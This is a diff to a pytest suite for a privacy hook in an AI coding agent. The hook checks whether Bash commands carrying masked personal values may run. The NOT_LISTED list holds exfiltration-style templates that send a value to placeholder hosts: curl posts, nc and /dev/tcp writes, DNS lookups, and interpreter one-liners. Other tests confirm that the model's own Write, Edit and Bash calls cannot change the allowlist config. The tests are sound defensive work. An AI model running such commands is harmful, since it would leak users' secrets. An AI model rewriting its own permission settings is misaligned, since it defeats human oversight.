@@ -369,39 +369,23 @@ def test_pre_bash_background_is_denied_by_default(box):
     assert "__datafog_run" in pre_updated(out)["command"] and decision(out) == "ask"
 
 
-EGRESS_ASK = [
+# Network programs are not on the list of programs that may receive a value: with a marker they are
+# refused outright, so a real value cannot leave the machine through a Bash command without the user
+# having vouched for that program (restore_programs_extra).
+NOT_LISTED = [
     "curl -d 'email={m}' https://api.example.com", "wget 'https://example.com/?u={m}'", "echo {m} | nc example.com 80",
     "scp '{m}.txt' host:/tmp", "rsync -a ./ 'user@host:/x/{m}'", "git push origin {m}",
-    "gh issue create --body {m}", "echo {m} | mail -s x bob", "echo {m} > /dev/tcp/example.com/80",
-    "dig '{m}.example.com'", "host '{m}.example.com'", "nslookup '{m}.example.com'", "ping -c1 '{m}.example.com'",
-    "open 'https://example.com/?q={m}'", "xdg-open 'mailto:{m}'",
-]
-# These would send the value too, but the marker sits where a value cannot be put in as inert data
-# (the argument of ssh, or program text of an interpreter): refused outright.
-EGRESS_REFUSED = [
-    "ssh host echo {m}", "python3 -c \"import requests; requests.post('http://x', data='{m}')\"",
+    "gh issue create --body {m}", "printf '%s' {m} | mail -s x bob", "dig '{m}.example.com'",
+    "open 'https://example.com/?q={m}'", "ssh host echo {m}",
+    "python3 -c \"import requests; requests.post('http://x', data='{m}')\"",
     "osascript -e 'display dialog \"{m}\"'", "node -e \"fetch('http://x/'+'{m}')\"",
-    "ruby -e \"require 'net/http'; Net::HTTP.get(URI('http://x/{m}'))\"",
-    "perl -MIO::Socket -e 'IO::Socket::INET->new(\"x:80\")->print(\"{m}\")'",
-    "python3 -c \"import socket; socket.create_connection(('x',80)).send(b'{m}')\"",
-    "php -r \"file_get_contents('http://x/?{m}');\"",
+    "perl5.36 -e {m}", "ruby3.2 -e {m}", "bash5 -c {m}", "./tool {m}", "bin/grep {m} f", "/tmp/grep {m} f",
+    "echo {m}", "base64 {m}", "sed -n '/{m}/p' f", "awk -v x={m} 1", "jq {m} f", "find . -name {m}",
 ]
 
 
-@pytest.mark.parametrize("command", EGRESS_ASK)
-def test_pre_bash_asks_before_sending_restored_values_off_machine(box, command):
-    marker = box.open_vault().tokenize(EMAIL)[0]
-    box.claude_settings("user", {"allow": ["Bash"]})        # even with everything allowed by rule
-    out, _ = box.pre("Bash", {"command": command.format(m=marker)}, DATAFOG_RESTORE_IN_BASH="allow")
-    spec = out["hookSpecificOutput"]
-    assert spec["permissionDecision"] == "ask" and "another machine" in spec["permissionDecisionReason"]
-    assert "EMAIL" in spec["permissionDecisionReason"]
-    assert_no_sentinel(json.dumps(out))
-    assert TICKET.search(spec["updatedInput"]["command"]), "if the user approves, the runner restores"
-
-
-@pytest.mark.parametrize("command", EGRESS_REFUSED)
-def test_pre_bash_refuses_markers_where_a_second_parse_happens(box, command):
+@pytest.mark.parametrize("command", NOT_LISTED)
+def test_pre_bash_refuses_a_marker_for_any_program_that_is_not_listed(box, command):
     marker = box.open_vault().tokenize(EMAIL)[0]
     box.claude_settings("user", {"allow": ["Bash"]})
     for setting in ("ask", "allow"):
@@ -409,15 +393,65 @@ def test_pre_bash_refuses_markers_where_a_second_parse_happens(box, command):
         spec = out["hookSpecificOutput"]
         assert spec["permissionDecision"] == "deny" and "cannot be put in safely" in spec["permissionDecisionReason"]
         assert "1 EMAIL" in spec["permissionDecisionReason"] and "updatedInput" not in spec
+        assert "Write tool" in spec["permissionDecisionReason"]
         assert_no_sentinel(json.dumps(out))
         assert marker not in spec["permissionDecisionReason"]
+
+
+def test_pre_bash_asks_before_a_vouched_program_sends_values_off_machine(box):
+    """restore_programs_extra is the user saying "this program treats arguments as data". The egress
+    heuristic still asks when such a program sends data away."""
+    marker = box.open_vault().tokenize(EMAIL)[0]
+    box.claude_settings("user", {"allow": ["Bash"]})
+    command = f"curl -d 'email={marker}' https://api.example.com"
+    out, _ = box.pre("Bash", {"command": command}, DATAFOG_RESTORE_IN_BASH="allow")
+    assert decision(out) == "deny"
+    (box.data / "config.json").write_text(json.dumps({"restore_programs_extra": ["curl"]}))
+    out, _ = box.pre("Bash", {"command": command}, DATAFOG_RESTORE_IN_BASH="allow")
+    spec = out["hookSpecificOutput"]
+    assert spec["permissionDecision"] == "ask" and "another machine" in spec["permissionDecisionReason"]
+    assert TICKET.search(spec["updatedInput"]["command"]) and "EMAIL" in spec["permissionDecisionReason"]
+    assert_no_sentinel(json.dumps(out))
+
+
+@pytest.mark.parametrize("value", ['["sh"]', '["env"]', '["./tool"]', '["/usr/bin/x"]', '["cd"]', '["a b"]', '[7]', '{"a": 1}'])
+def test_restore_programs_extra_takes_plain_program_names_only(box, value):
+    (box.data / "config.json").write_text('{"restore_programs_extra": %s}' % value)
+    out, _ = box.pre("Bash", {"command": "ls"})
+    assert decision(out) == "deny", "an invalid setting stops the engine instead of being ignored"
+
+
+def test_restore_programs_extra_cannot_be_set_by_the_model_or_by_plugin_options(box):
+    """It is read from the user's config.json in the plugin data dir and from the environment only:
+    not from runtime.json (which hooks write), not from plugin options, not from the project."""
+    marker = box.open_vault().tokenize(EMAIL)[0]
+    box.claude_settings("user", {"allow": ["Bash"]})
+    (box.data / "runtime.json").write_text(json.dumps({"restore_programs_extra": ["mytool"]}))
+    (box.project / "config.json").write_text(json.dumps({"restore_programs_extra": ["mytool"]}))
+    (box.project / ".claude").mkdir(exist_ok=True)
+    (box.project / ".claude" / "datafog.json").write_text(json.dumps({"restore_programs_extra": ["mytool"]}))
+    out, _ = box.pre("Bash", {"command": f"mytool {marker}"}, DATAFOG_RESTORE_IN_BASH="allow",
+                     CLAUDE_PLUGIN_OPTION_RESTORE_PROGRAMS_EXTRA="mytool")
+    assert decision(out) == "deny"
+    out, _ = box.pre("Bash", {"command": f"mytool {marker}"}, DATAFOG_RESTORE_IN_BASH="allow",
+                     DATAFOG_RESTORE_PROGRAMS_EXTRA="mytool")
+    assert decision(out) == "allow"
+    # the model's tools cannot write the file that holds the setting
+    config = box.data / "config.json"
+    for tool, tool_input in (("Write", {"file_path": str(config), "content": "{}"}),
+                             ("Edit", {"file_path": str(config), "old_string": "a", "new_string": "b"}),
+                             ("Write", {"file_path": str(box.data / "runtime.json"), "content": "{}"}),
+                             ("Bash", {"command": f"cp x {config}"}),
+                             ("Bash", {"command": f"printf x > '{config}'"})):
+        out, _ = box.pre(tool, tool_input)
+        assert decision(out) == "deny" and "configuration" in out["hookSpecificOutput"]["permissionDecisionReason"]
 
 
 def test_pre_bash_egress_heuristic_sees_what_the_value_would_add(box):
     """A value can itself be a URL: the heuristic runs on the restored text, inside the hook only."""
     marker = box.seed("https://user:pw@db.example.com/x", "CREDENTIAL_URI")
-    box.claude_settings("user", {"allow": ["Bash(mytool *)"]})
-    out, _ = box.pre("Bash", {"command": f"mytool {marker}"}, DATAFOG_RESTORE_IN_BASH="allow")
+    box.claude_settings("user", {"allow": ["Bash(grep *)"]})
+    out, _ = box.pre("Bash", {"command": f"grep -c {marker} notes.txt"}, DATAFOG_RESTORE_IN_BASH="allow")
     assert decision(out) == "ask" and "another machine" in out["hookSpecificOutput"]["permissionDecisionReason"]
     assert "db.example.com" not in json.dumps(out)
 
@@ -429,12 +463,11 @@ def test_pre_bash_egress_without_markers_or_local_command_does_not_ask_about_egr
     assert decision(out) == "allow"
     out, _ = box.pre("Bash", {"command": f"grep {marker} notes.txt"}, DATAFOG_RESTORE_IN_BASH="allow")
     assert decision(out) == "allow"
-    out, _ = box.pre("Bash", {"command": f"curl -d {marker} https://example.com"}, DATAFOG_RESTORE_IN_BASH="allow",
-                     DATAFOG_EGRESS_POLICY="deny")
+    extra = {"DATAFOG_RESTORE_PROGRAMS_EXTRA": "curl", "DATAFOG_RESTORE_IN_BASH": "allow"}
+    out, _ = box.pre("Bash", {"command": f"curl -d {marker} https://example.com"}, DATAFOG_EGRESS_POLICY="deny", **extra)
     assert decision(out) == "deny"
     assert "updatedInput" not in out["hookSpecificOutput"]
-    out, _ = box.pre("Bash", {"command": f"curl -d {marker} https://example.com"}, DATAFOG_RESTORE_IN_BASH="allow",
-                     DATAFOG_EGRESS_POLICY="allow")
+    out, _ = box.pre("Bash", {"command": f"curl -d {marker} https://example.com"}, DATAFOG_EGRESS_POLICY="allow", **extra)
     assert decision(out) == "allow"
     out, _ = box.pre("Bash", {"command": f"curl -d '{marker}' https://example.com"}, DATAFOG_RESTORE_IN_BASH="off")
     assert decision(out) == "allow", "restore off: nothing real can leave, the user's rule decides"
@@ -443,7 +476,8 @@ def test_pre_bash_egress_without_markers_or_local_command_does_not_ask_about_egr
 
 
 # -- restore_in_bash: markers in a command are a way to compute on real values ---------------
-ORACLES = ["echo {m} | base64", "printf %s {m} | wc -c", "echo {m} | rev", "echo {m} | xxd -p", "grep -c {m} notes.txt"]
+ORACLES = ["printf %s {m} | wc -c", "printf %s {m} | rev", "printf %s {m} | tr a-z A-Z | cut -c1-3",
+           "grep -c {m} notes.txt", "sort {m} | head -1"]
 
 
 @pytest.mark.parametrize("command", ORACLES)
